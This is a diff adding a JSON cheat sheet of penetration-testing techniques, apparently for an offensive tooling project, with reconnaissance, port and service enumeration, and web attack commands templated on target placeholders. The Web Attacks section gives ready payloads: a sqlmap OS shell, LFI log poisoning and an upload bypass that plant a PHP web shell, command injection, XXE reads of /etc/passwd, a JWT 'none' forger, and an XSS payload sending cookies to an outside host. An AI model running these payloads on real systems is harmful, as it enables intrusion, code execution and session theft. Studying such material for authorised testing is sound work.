@@ -1,0 +1,56 @@
+[
+  {
+    "category": "Recon",
+    "techniques": [
+      {"id":"recon_1","name":"Whois Lookup","purpose":"Gather domain registration info, registrar, nameservers","when_to_use":"Early passive recon on a domain target","command":"whois {TARGET_DOMAIN}","tags":["recon","osint"]},
+      {"id":"recon_2","name":"DNS Full Record Dump","purpose":"Find all DNS records (A, MX, NS, TXT, CNAME)","when_to_use":"When targeting a domain","command":"dig any {TARGET_DOMAIN} @8.8.8.8","tags":["recon","dns"]},
+      {"id":"recon_3","name":"DNS Zone Transfer","purpose":"Dump all DNS records if misconfigured","when_to_use":"When DNS server allows zone transfers","command":"dig axfr {TARGET_DOMAIN} @{TARGET_IP}","tags":["recon","dns","zone-transfer"]},
+      {"id":"recon_4","name":"Subdomain Brute Force (gobuster)","purpose":"Discover hidden subdomains","when_to_use":"Web app recon phase","command":"gobuster dns -d {TARGET_DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50","tags":["recon","dns","gobuster"]},
+      {"id":"recon_5","name":"Subdomain Brute Force (ffuf)","purpose":"Fast subdomain discovery","when_to_use":"Alternative to gobuster for DNS fuzzing","command":"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_DOMAIN} -H 'Host: FUZZ.{TARGET_DOMAIN}' -fs 0 -mc 200,301,302","tags":["recon","dns","ffuf"]},
+      {"id":"recon_6","name":"theHarvester OSINT","purpose":"Collect emails, subdomains, IPs from public sources","when_to_use":"Passive recon phase","command":"theHarvester -d {TARGET_DOMAIN} -b all -f harvest_output","tags":["recon","osint"]},
+      {"id":"recon_7","name":"Reverse DNS Lookup","purpose":"Find hostname from IP","when_to_use":"When you have an IP and need the hostname","command":"nslookup {TARGET_IP}","tags":["recon","dns"]},
+      {"id":"recon_8","name":"Certificate Transparency Search","purpose":"Find subdomains via SSL cert logs","when_to_use":"Passive subdomain enumeration","command":"curl -s 'https://crt.sh/?q=%.{TARGET_DOMAIN}&output=json' | jq '.[].name_value' | sort -u","tags":["recon","osint","ssl"]},
+      {"id":"recon_9","name":"Shodan Host Lookup","purpose":"Find open ports and services from internet","when_to_use":"External recon on target IP","command":"shodan host {TARGET_IP}","tags":["recon","osint","shodan"]},
+      {"id":"recon_10","name":"Google Dorking - Login Pages","purpose":"Find exposed login panels","when_to_use":"Web recon phase","command":"site:{TARGET_DOMAIN} inurl:login OR inurl:admin OR inurl:portal","tags":["recon","osint","google"]}
+    ]
+  },
+  {
+    "category": "Enumeration",
+    "techniques": [
+      {"id":"enum_1","name":"Full TCP Port Scan","purpose":"Discover all 65535 open TCP ports","when_to_use":"Initial scan — always run this","command":"nmap -p- --min-rate 5000 -sV -sC -oN nmap_full.txt {TARGET_IP}","tags":["nmap","enumeration"]},
+      {"id":"enum_2","name":"Quick Top-1000 Scan","purpose":"Fast initial port discovery","when_to_use":"Quick first look before full scan","command":"nmap -sV -sC --open -oN nmap_quick.txt {TARGET_IP}","tags":["nmap","enumeration"]},
+      {"id":"enum_3","name":"UDP Top-200 Scan","purpose":"Discover open UDP services (SNMP, DNS, TFTP)","when_to_use":"After TCP scan","command":"sudo nmap -sU --top-ports 200 --open {TARGET_IP}","tags":["nmap","udp"]},
+      {"id":"enum_4","name":"Nmap Vuln Scripts","purpose":"Run vulnerability detection scripts","when_to_use":"After identifying open services","command":"nmap --script vuln -p {TARGET_IP}","tags":["nmap","vuln"]},
+      {"id":"enum_5","name":"Web Directory Brute Force","purpose":"Find hidden directories and files","when_to_use":"When a web server is running","command":"gobuster dir -u http://{TARGET_IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -o gobuster.txt -t 50","tags":["web","gobuster"]},
+      {"id":"enum_6","name":"FFUF Vhost Fuzzing","purpose":"Discover virtual hosts on same IP","when_to_use":"When target uses name-based vhosting","command":"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H 'Host: FUZZ.{TARGET_DOMAIN}' -fs 0","tags":["web","ffuf","vhost"]},
+      {"id":"enum_7","name":"Nikto Web Scan","purpose":"Detect web vulnerabilities and misconfigs","when_to_use":"Web server enumeration","command":"nikto -h http://{TARGET_IP} -o nikto.txt","tags":["web","nikto"]},
+      {"id":"enum_8","name":"SNMP Enumeration (v2c)","purpose":"Extract system info, users, processes via SNMP","when_to_use":"When UDP 161 is open","command":"snmpwalk -v2c -c public {TARGET_IP} 1.3.6.1.2.1","tags":["snmp","enumeration"]},
+      {"id":"enum_9","name":"SNMP Brute Force Community","purpose":"Find valid SNMP community strings","when_to_use":"When SNMP is open but public fails","command":"onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {TARGET_IP}","tags":["snmp","brute"]},
+      {"id":"enum_10","name":"LDAP Enumeration (anonymous)","purpose":"Dump AD users and objects without creds","when_to_use":"When LDAP (389) is open on a DC","command":"ldapsearch -x -H ldap://{TARGET_IP} -b 'DC=domain,DC=local' -s sub '(objectClass=person)' sAMAccountName","tags":["ldap","ad"]},
+      {"id":"enum_11","name":"RPC User Enumeration","purpose":"Enumerate domain users via RPC","when_to_use":"When port 135/445 is open","command":"rpcclient -U '' -N {TARGET_IP} -c 'enumdomusers;enumdomgroups'","tags":["rpc","smb"]},
+      {"id":"enum_12","name":"FTP Anonymous Login","purpose":"Check for anonymous FTP access","when_to_use":"When FTP (21) is open","command":"ftp {TARGET_IP}","tags":["ftp","enumeration"]},
+      {"id":"enum_13","name":"WinRM Check","purpose":"Check if WinRM is accessible","when_to_use":"When port 5985/5986 is open","command":"crackmapexec winrm {TARGET_IP} -u {USERNAME} -p {PASSWORD}","tags":["winrm","enum"]},
+      {"id":"enum_14","name":"MSSQL Enumeration","purpose":"Enumerate MSSQL server","when_to_use":"When port 1433 is open","command":"nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config {TARGET_IP}","tags":["mssql","enum"]},
+      {"id":"enum_15","name":"MySQL Enumeration","purpose":"Enumerate MySQL server","when_to_use":"When port 3306 is open","command":"nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases {TARGET_IP}","tags":["mysql","enum"]}
+    ]
+  },
+  {
+    "category": "Web Attacks",
+    "techniques": [
+      {"id":"web_1","name":"SQLMap Auto Exploit","purpose":"Detect and exploit SQL injection automatically","when_to_use":"When a parameter is potentially injectable","command":"sqlmap -u 'http://{TARGET_IP}/page?id=1' --dbs --batch --level 3 --risk 2 --random-agent","tags":["sqli","sqlmap"]},
+      {"id":"web_2","name":"SQLMap POST Data","purpose":"Test POST parameters for SQLi","when_to_use":"Login forms or POST-based inputs","command":"sqlmap -u 'http://{TARGET_IP}/login' --data='user={USERNAME}&pass={PASSWORD}' --dbs --batch --level 5","tags":["sqli","sqlmap"]},
+      {"id":"web_3","name":"SQLMap OS Shell","purpose":"Get OS command execution via SQLi","when_to_use":"When SQLi exists and DB user has FILE privilege","command":"sqlmap -u 'http://{TARGET_IP}/page?id=1' --os-shell --batch","tags":["sqli","sqlmap","rce"]},
+      {"id":"web_4","name":"LFI Basic Test","purpose":"Read local files via path traversal","when_to_use":"When a file parameter exists in URL","command":"curl 'http://{TARGET_IP}/page?file=../../../../etc/passwd'","tags":["lfi","web"]},
+      {"id":"web_5","name":"LFI via PHP Filter (Source Read)","purpose":"Read PHP source code via base64 filter","when_to_use":"When LFI exists and target runs PHP","command":"curl 'http://{TARGET_IP}/page?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d","tags":["lfi","php"]},
+      {"id":"web_6","name":"LFI Log Poisoning (Apache)","purpose":"Turn LFI into RCE via log injection","when_to_use":"When LFI can read /var/log/apache2/access.log","command":"curl -s 'http://{TARGET_IP}/' -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' && curl 'http://{TARGET_IP}/page?file=../../../../var/log/apache2/access.log&cmd=id'","tags":["lfi","rce","log-poison"]},
+      {"id":"web_7","name":"File Upload Bypass (Magic Bytes)","purpose":"Bypass file type checks with magic bytes","when_to_use":"When upload only allows images","command":"echo -e '\\xff\\xd8\\xff<?php system($_GET[\"cmd\"]); ?>' > shell.php.jpg","tags":["upload","bypass"]},
+      {"id":"web_8","name":"Command Injection Test","purpose":"Execute OS commands via web input","when_to_use":"When user input is passed to OS commands","command":"curl 'http://{TARGET_IP}/ping?ip=127.0.0.1;id'","tags":["cmdi","web"]},
+      {"id":"web_9","name":"XSS Cookie Steal","purpose":"Steal session cookies via XSS","when_to_use":"When reflected/stored XSS exists","command":"<script>fetch('http://{TARGET_IP}:8080/?c='+btoa(document.cookie))</script>","tags":["xss","web"]},
+      {"id":"web_10","name":"FFUF Parameter Fuzzing","purpose":"Discover hidden GET parameters","when_to_use":"When fuzzing web app parameters","command":"ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://{TARGET_IP}/page?FUZZ=test' -fs 0","tags":["ffuf","web"]},
+      {"id":"web_11","name":"SSRF Internal Probe","purpose":"Access internal services via SSRF","when_to_use":"When app fetches URLs based on user input","command":"curl 'http://{TARGET_IP}/fetch?url=http://127.0.0.1:8080/admin'","tags":["ssrf","web"]},
+      {"id":"web_12","name":"XXE File Read","purpose":"Read local files via XML External Entity","when_to_use":"When app parses XML input","command":"curl -X POST 'http://{TARGET_IP}/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'","tags":["xxe","web"]},
+      {"id":"web_13","name":"IDOR Test","purpose":"Access other users' data by changing IDs","when_to_use":"When object references are in URL/body","command":"curl -s 'http://{TARGET_IP}/api/user/2' -H 'Cookie: session=YOUR_COOKIE'","tags":["idor","web"]},
+      {"id":"web_14","name":"JWT None Algorithm Attack","purpose":"Bypass JWT signature verification","when_to_use":"When app uses JWT and doesn't validate alg","command":"python3 -c \"import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')\"","tags":["jwt","web","bypass"]}
+    ]
+  }
+]
